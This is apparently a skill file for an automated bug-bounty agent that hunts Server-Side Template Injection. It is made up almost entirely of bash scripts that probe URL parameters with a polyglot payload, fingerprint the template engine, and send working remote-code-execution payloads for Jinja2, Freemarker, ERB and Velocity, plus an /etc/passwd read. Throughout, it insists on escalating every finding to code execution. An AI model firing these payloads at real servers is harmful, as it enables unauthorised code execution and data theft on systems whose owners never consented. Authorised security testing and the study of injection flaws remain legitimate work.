---
name: k1nzr3c0n-hunt-ssti
description: "Server-Side Template Injection hunting skill. Covers Jinja2 (Python), Twig (PHP), Freemarker (Java), ERB (Ruby), Thymeleaf, Velocity, Mako, Smarty. Polyglot probe '{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}'. Always escalate to RCE — SSTI is rarely useful below RCE impact."
tags: [ssti, template-injection, rce, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — SSTI (Server-Side Template Injection)

> **SSTI = RCE**: Low/Medium SSTI reports get rejected. Escalate to RCE or it's not worth submitting.
> **Polyglot first**: one probe covers 5 engines simultaneously.

---

## Crown Jewels

```
Priority 1 — RCE via Jinja2 __class__.__mro__ chain (Flask/Django)
Priority 2 — RCE via Freemarker freemarker.template.utility.Execute
Priority 3 — RCE via ERB system() in Rails
Priority 4 — RCE via Velocity Runtime.getRuntime().exec()
Priority 5 — Information disclosure via template context leak (env vars, config)
```

---

## Phase 0 — Bootstrap

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_ssti_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

# SSTI candidate parameters (user input reflected in template)
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s"]+[?&](?:name|msg|message|title|subject|body|text|content|template|tpl|greeting|email|first_name|last_name|username|search|q|comment)=[^\s&"]+' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/ssti_candidates.txt" | wc -l \
  | xargs echo "SSTI candidates:"
```

## Phase 1 — Polyglot Probe

```bash
echo "=== SSTI Polyglot Detection ==="
# Single probe detects: Jinja2, Twig, Freemarker, ERB, Velocity, Smarty
POLYGLOT='{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}'

for EP in $(head -20 "$HUNT/ssti_candidates.txt"); do
  BASE=$(echo "$EP" | grep -oP 'https?://[^?]+\?')
  PARAM=$(echo "$EP" | grep -oP '([?&][a-zA-Z_-]+=)[^\s&]+' | head -1 | grep -oP '^[?&][a-zA-Z_-]+=')
  
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$POLYGLOT")
  RESP=$(curl -sk "${BASE}${PARAM}${ENCODED}" 2>/dev/null)
  
  # Check for evaluated results
  echo "$RESP" | grep -oP '49|\$\{49\}|\#\{49\}|49<|>49' | head -1 \
    && echo "  [SSTI HIT] $EP — engine: $(echo $RESP | grep -oP '49' | head -1) evaluated"
done
```

## Phase 2 — Engine Fingerprint

```bash
echo "=== SSTI Engine Fingerprint ==="
ENDPOINT="${SSTI_ENDPOINT:-}"

FINGERPRINTS=(
  # Jinja2/Python
  "{{7*'7'}}"       # → 7777777 (Jinja2) vs 49 (Twig)
  "{{config}}"      # Jinja2: dumps Flask config
  "{{request}}"     # Jinja2: Flask request object
  # Twig/PHP
  "{{7*'7'}}"       # → 49 in Twig
  "{{_self.env}}"   # Twig: environment dump
  # Freemarker/Java
  '${7*7}'          # → 49 in Freemarker
  '<#assign x=7*7>${x}'  # Freemarker
  # ERB/Ruby
  '<%= 7*7 %>'     # → 49
  '<%= system("id") %>'
  # Velocity/Java
  '#set($x = 7*7)${x}'
  # Smarty/PHP
  '{$smarty.version}'
  # Mako/Python
  '${7*7}'
)

for F in "${FINGERPRINTS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$F")
  RESP=$(curl -sk "${ENDPOINT}${ENCODED}" 2>/dev/null | head -c 200)
  echo "  PROBE: ${F:0:30} → RESP: ${RESP:0:50}"
done
```

## Phase 3 — RCE Escalation

```bash
echo "=== SSTI RCE Payloads ==="
ENDPOINT="${SSTI_ENDPOINT:-}"
CMD="id"

# ── Jinja2 (Python/Flask) ──────────────────────────────────────────────────────
JINJA2_PAYLOADS=(
  # MRO chain → subprocess
  "{{request.__class__.__mro__[1].__subclasses__()[287]('${CMD}',shell=True,stdout=-1).communicate()[0]}}"
  # config object
  "{{config.__class__.__init__.__globals__['os'].popen('${CMD}').read()}}"
  # Lipsum/cycler builtins (when request is not available)
  "{{lipsum.__globals__['os'].popen('${CMD}').read()}}"
  "{{cycler.__init__.__globals__.os.popen('${CMD}').read()}}"
  # Simple globals
  "{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"${CMD}\").read()')}}"
)

echo "--- Jinja2 RCE ---"
for P in "${JINJA2_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P")
  RESP=$(curl -sk "${ENDPOINT}${ENCODED}" 2>/dev/null)
  echo "$RESP" | grep -oP 'uid=\d+\([^)]+\)' && echo "  [JINJA2 RCE] ${P:0:50}"
done

# ── Freemarker (Java) ──────────────────────────────────────────────────────────
echo ""
echo "--- Freemarker RCE ---"
FM_PAYLOADS=(
  '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("'"${CMD}"'")}'
  '<#assign is=object?api.class.getResourceAsStream("/etc/passwd")>${is}'
)
for P in "${FM_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P")
  RESP=$(curl -sk "${ENDPOINT}${ENCODED}" 2>/dev/null)
  echo "$RESP" | grep -qE 'uid=|root:' && echo "  [FREEMARKER RCE] ${P:0:50}"
done

# ── ERB (Ruby) ─────────────────────────────────────────────────────────────────
echo ""
echo "--- ERB (Ruby) RCE ---"
for P in "<%= \`${CMD}\` %>" "<%= system('${CMD}') %>"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$P")
  RESP=$(curl -sk "${ENDPOINT}${ENCODED}" 2>/dev/null)
  echo "$RESP" | grep -qE 'uid=|root:' && echo "  [ERB RCE] $P"
done

# ── Velocity (Java) ────────────────────────────────────────────────────────────
echo ""
echo "--- Velocity RCE ---"
VEL='#set($rt = $class.forName("java.lang.Runtime"))#set($ex = $rt.getRuntime().exec("'"${CMD}"'"))#set($exout = $ex.getInputStream())#set($br = $class.forName("java.io.BufferedReader").getDeclaredConstructors()[0])#set($dummy = $br.setAccessible(true))#set($rdr = $br.newInstance($class.forName("java.io.InputStreamReader").getDeclaredConstructors()[0].newInstance($exout)))${rdr.readLine()}'
ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$VEL")
curl -sk "${ENDPOINT}${ENCODED}" | grep -oP 'uid=\d+\([^)]+\)'
```

## Phase 4 — Gate 0

```bash
echo "=== SSTI Gate 0 ==="
echo "  □ Expression evaluated (7*7=49 visible in response)"
echo "  □ Engine identified (Jinja2/Twig/Freemarker/ERB/Velocity)"
echo "  □ RCE confirmed: 'id' or 'whoami' output in response"
echo "  □ Impact: state what data/systems are accessible via RCE"
echo "  □ Never submit SSTI without RCE proof — impact too low alone"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
SSTI in [name parameter] on [/greet endpoint] via Jinja2 leads to Remote Code Execution (uid=33 www-data confirmed)
Server-Side Template Injection (Freemarker) in [email template] allows arbitrary Java code execution
```
